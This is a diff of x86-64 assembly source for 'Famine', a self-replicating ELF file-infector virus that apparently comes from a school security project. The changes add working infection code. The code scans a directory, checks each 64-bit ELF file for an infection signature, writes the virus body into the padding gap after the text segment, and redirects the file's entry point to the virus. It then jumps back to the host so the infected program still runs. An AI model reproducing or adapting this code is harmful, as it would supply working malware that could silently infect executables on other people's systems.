@@ -1,21 +1,26 @@
 
 %include "famine.inc"
 
-_starting:
 bits 64
 section .text
 default rel
-global main
-extern printf
+global _start
+host_entry	dq	0x0
 
-	_exit:
-	; === Exit without error ===
-	mov rax, SYS_EXIT
-	mov rdi, 42
-	syscall
+_start:
+	call entry
+entry:
+;	pop r15
+;	mov r14, (entry - _start)
+;	sub r15, r14
 
-main:
-	_start:
+	push r15
+	push rdi
+	push rsi
+	push rcx
+	push rdx
+	push rbp
+	
 	; === Placing our 'famine' struct on the stack ===
 	mov rbp, rsp
 	push rbp
@@ -23,16 +28,20 @@ main:
 	sub rsp, famine_size
 	mov rdi, VIRUS_SIZE
 	mov FAM(famine.payload_size), rdi
-;	write_format payload_sz, FAM(famine.payload_size)
 
-	mov rdi, target_dir
+	lea rdi, [rel target_dir]
 	call _traverse_dirs
-	mov rax, _start
-	add rax, VIRUS_SIZE
-	sub rax, 0xc
-	mov qword rax, [rax]
+	mov rax, [rel _start - 0x8]
 	cmp rax, 0
 	je _exit
+
+	pop rbp
+	pop rdx
+	pop rcx
+	pop rsi
+	pop rdi
+	pop r15
+
 	jmp rax
 
 
@@ -45,7 +54,7 @@ _traverse_dirs:
 	cmp rax, 0
 	jl _return
 	mov rax, SYS_OPEN
-	mov rdi, curr_dir
+	lea rdi, [curr_dir]
 	mov rsi, O_RDONLY
 	xor rdx, rdx
 	syscall
@@ -53,7 +62,7 @@ _traverse_dirs:
 	jl _return
 
 	; === getdents(dir_fd, struc linux_dirent *dirp, count) ===
-	mov rdi, rax												; rax has the fd of the "open" call
+	mov rdi, rax												; rax has the fd of the "open" call on directory
 	sub rsp, DIRENTS_BUFF_SIZE									; Making space on the stack for our dirent array
 	mov rsi, rsp												; pointing 2nd argument of getents to the space on the stack
 	sub rsp, dirent_wrapper_size								; Making space for the wrapper that will contain total_dreclen
@@ -66,26 +75,25 @@ _traverse_dirs:
 
 	; === Beginning of the loop iterating through files of directory ===
 	_list_dir:
-		xor r14, r14											; r14 stores d_reclen
-		lea r15, [rsp + dirent_wrapper_size]					; r15 used to navigate current dirent, and ultimatly store d_name
-		add r15, [rsp + dirent_wrapper.total_dreclen]			; bring r15 to our current dirent (start of dirent array + total d_reclen browsed until now)
-		mov r13, r15											; r13 will store d_type of current dirent
-		add r15, D_RECLEN_OFF									; bring r15 to the offset at which d_reclen is located
-		mov r14w, word [r15]									; mov d_reclen (pointed by r15) to r14
+		xor r14, r14											; r14 will store d_reclen
+		lea rdi, [rsp + dirent_wrapper_size]					; rdi used to navigate current dirent, and ultimatly store d_name
+		add rdi, [rsp + dirent_wrapper.total_dreclen]			; bring rdi to our current dirent (start of dirent array + total d_reclen browsed until now)
+		mov r13, rdi											; r13 will store d_type of current dirent
+		add rdi, D_RECLEN_OFF									; bring rdi to the offset at which d_reclen is located
+		mov r14w, word [rdi]									; mov d_reclen (pointed by rdi) to r14
 		cmp r14, 0												; if d_reclen is 0, we reached the end of the directories and we exit
 		je _exit_dir_loop
-		add r15, D_NAME_OFF - D_RECLEN_OFF						; bring r15 to the offset of d_name
+		add rdi, D_NAME_OFF - D_RECLEN_OFF						; bring rdi to the offset of d_name
 		add [rsp + dirent_wrapper.total_dreclen], r14			; keep track of the total d_reclen
 		sub r14, 1
 		add r13, r14											; we're adding d_reclen - 1 to r13 in order to bring it to the d_type offset
 		movzx r13, byte [r13]									; r13 has d_type value
 
-		mov rdi, r15											; we move the filename to rdi
 		cmp r13, 0x8											; r13 has d_type. If type is 0x8 (regular file), handle the file
 		je _handle_file
 		cmp r13, 0x4											; If type is 0x4 (directory), handle the directory
 		je _handle_dir
-		jmp _list_dir											; In all other cases, do nothing with the file			
+		jmp _list_dir											; In all other cases, do nothing with the file
 
 
 
@@ -105,7 +113,7 @@ _file:
 
 	; === Calculate the size of the file with lseek ===
 	mov rdi, rax
-	mov rsi, 0
+	xor rsi, rsi
 	mov rdx, 2
 	mov rax, SYS_LSEEK
 	syscall
@@ -143,19 +151,16 @@ _file:
 	movzx rax, byte [rax]
 	cmp rax, 0x2
 	jne _not_valid_x64
-;	write_format string, info_1
 
 	; === Getting the segments offset in file ===
 	mov rax, FAM(famine.map_ptr)
 	add rax, elf64_ehdr.e_phoff
-;	write_format phoff, [rax]
 
 	; === Finding the text segment in file ===
 	mov r15, [rax]												; Storing e_phoff in r15
 	mov r14, FAM(famine.map_ptr)
 	add r14, elf64_ehdr.e_phnum
 	movzx r14, word [r14]										; Storing e_phnum in r14
-;	write_format phnum, r14
 
 	dec r14														; Decrementing by 1 since our counter starts at 0
 	mov rax, FAM(famine.map_ptr)
@@ -172,7 +177,6 @@ _file:
 		add rax, elf64_phdr.p_offset
 		mov rdi, [rax]
 		mov FAM(famine.txt_offset), rdi
-;		write_format text_seg, FAM(famine.txt_offset)
 
 		add rax, elf64_phdr.p_vaddr - elf64_phdr.p_offset
 		mov rdi, [rax]
@@ -181,12 +185,21 @@ _file:
 		add rax, elf64_phdr.p_filesz - elf64_phdr.p_vaddr
 		mov rdi, [rax]
 		mov FAM(famine.txt_filesz), rdi
-;		write_format filesz, FAM(famine.txt_filesz)
 
 		add rax, elf64_phdr_size - (elf64_phdr.p_filesz - elf64_phdr.p_offset)
 		mov rdi, [rax]
 		mov FAM(famine.next_offset), rdi
-;		write_format next_seg, FAM(famine.next_offset)
+
+	; === Is the file already infected ? ===
+	mov rdi, FAM(famine.map_ptr)
+	add rdi, FAM(famine.txt_offset)
+	add rdi, FAM(famine.txt_filesz)
+	add rdi, 8
+	add rdi, VIRUS_SIZE
+	sub rdi, (_finish - signature)
+	mov rax, [rel signature]
+	cmp rax, qword [rdi]
+	je _not_valid_x64
 
 	; === Calculating the space available in padding gap ===
 	mov rsi, FAM(famine.next_offset)
@@ -194,13 +207,11 @@ _file:
 	add rdi, FAM(famine.txt_filesz)
 	sub rsi, rdi
 	mov FAM(famine.gap_size), rsi
-;	write_format gap_sz, FAM(famine.gap_size)
 
 	; === Comparing gap size and virus size ===
 	mov rdi, FAM(famine.payload_size)
 	cmp rdi, rsi
 	jg _not_enough_space
-;	write_string enough_sp, 27
 
 	; === Patch ELF entry point ===
 	mov rax, FAM(famine.map_ptr)
@@ -210,25 +221,25 @@ _file:
 ;	write_format entry, FAM(famine.orig_entry)
 	mov rdi, FAM(famine.txt_vaddr)
 	add rdi, FAM(famine.txt_filesz)
+	add rdi, 0x8
 	mov [rax], rdi
-;	write_format entry, [rax]
 	
 	; === Writing virus from injection point ===
 	mov rdi, FAM(famine.map_ptr)
 	add rdi, FAM(famine.txt_offset)
 	add rdi, FAM(famine.txt_filesz)								; RDI at injection point
-	mov rsi, _start												; RSI at start of virus
-	mov rcx, VIRUS_SIZE											; Copy whole virus to injection point [faire un -4 ici et ajouter manuellement entry point ?]
-	repnz movsb
 	lea rsi, FAM(famine.orig_entry)
-	mov rcx, 0x8
-	repnz movsb													; Copy host entry point
-
-
-
+	mov rcx, 0x1
+	repnz movsq													; Copy host entry point
+	
+	mov rdi, FAM(famine.map_ptr)
+	add rdi, FAM(famine.txt_offset)
+	add rdi, FAM(famine.txt_filesz)								; RDI at injection point
+	add rdi, 0x8
+	lea rsi, [rel _start]												; RSI at start of virus - RELATIVE HERE !
+	mov rcx, VIRUS_SIZE											; Copy whole virus to injection point
+	repnz movsb
 	jmp _list_dir
-
-
 
 
 _is_text_segment:
@@ -247,86 +258,32 @@ _is_text_segment:
 
 _not_valid_x64:
 	; === Stop handling file after error ; silently continue _list_dir loop ===
-;	write_format string, file_error
 	jmp _list_dir
 
 _not_enough_space:
-;	write_format string, file_error
 	jmp _list_dir
 
 _return:
 	ret
 
-
-; ##### UTILITY FUNCTIONS FOR LOOPING THROUGH TARGET DIRECTORIES #####
-
 _handle_dir:
-	call _iterable_dir
-	cmp rax, 0x0
-	je n_iter
-	iter:
-;		write_format directory_i, r15
-		jmp _list_dir
-	n_iter:
-;		write_format directory_n, r15
-		jmp _list_dir
+	jmp _list_dir
 
 _handle_file:
-;	write_format file, r15
 	jmp _file
-
-_iterable_dir:
-	cmp byte [rdi], 0x2e	; rdi has directory name.
-	jne iterable			; |
-	inc rdi					; |
-	cmp byte [rdi], 0x0		; |
-	je non_iterable			; |
-	cmp byte [rdi], 0x2e	; |		--> If the directory name is '.' or '..', consider it non-iterable for recursion
-	jne iterable			; |
-	inc rdi					; |
-	cmp byte [rdi], 0x0		; |
-	je non_iterable			; |
-	iterable:
-		mov al, 0x1
-		movzx rax, al
-		ret
-	non_iterable:
-		mov al, 0x0
-		movzx rax, al
-		ret
 
 _exit_dir_loop:
 	add rsp, DIRENTS_BUFF_SIZE
 	add rsp, dirent_wrapper_size
 	ret
 
+_exit:
+	mov rax, SYS_EXIT
+	mov rdi, 0
+	syscall
 
 target_dir	db		"/tmp/test",0x0
 curr_dir	db		".",0x0
-fname		db		"./test/sample",0x0
-debug		db		"Hi",0x0a,0x0
-file_error	db		"Not a valid ELF x64 file",0x0
-
-string		db		"[*] %s",0x0a,0x0
-num			db		"[*] %d",0x0a,0x0
-hex			db		"[*] 0x%x",0x0a,0x0
-pointer		db		"[*] %p",0x0a,0x0
-char		db		"[*] %c",0x0a,0x0
-
-info_1		db		"Valid ELF x64 file",0x0
-
-directory_n	db		0x0a,"[*] DIRECTORY (non-iterable) : %s",0x0a,0x0
-directory_i	db		0x0a,"[*] DIRECTORY (iterable) : %s",0x0a,0x0
-file		db		0x0a,"[*] FILE : %s",0x0a,"--> Starting handling file '%1$s'",0x0a,0x0
-phoff		db		"[*] phoff is %d",0x0a,0x0
-phnum		db		"[*] phnum is %d",0x0a,0x0
-text_seg	db		"[*] Text segment at offset 0x%016x",0x0a,0x0
-next_seg	db		"[*] Next segment at offset 0x%016x",0x0a,0x0
-filesz		db		"[*] p_filesz of segment is %d",0x0a,0x0
-gap_sz		db		"[*] Gap size is %d bytes",0x0a,0x0
-payload_sz	db		"[*] Payload size is %d bytes",0x0a,0x0
-enough_sp	db		"[*] Enough space to inject",0x0a,0x0
-entry		db		"[*] Entry point of elf is %p",0x0a,0x0
-h_e			db		"[!] Host entry point is %d",0x0a,0x0
+signature	db		"Famine version 1.0 (c)oded by qroland",0x0
 _finish:
-host_entry	dq		0
+
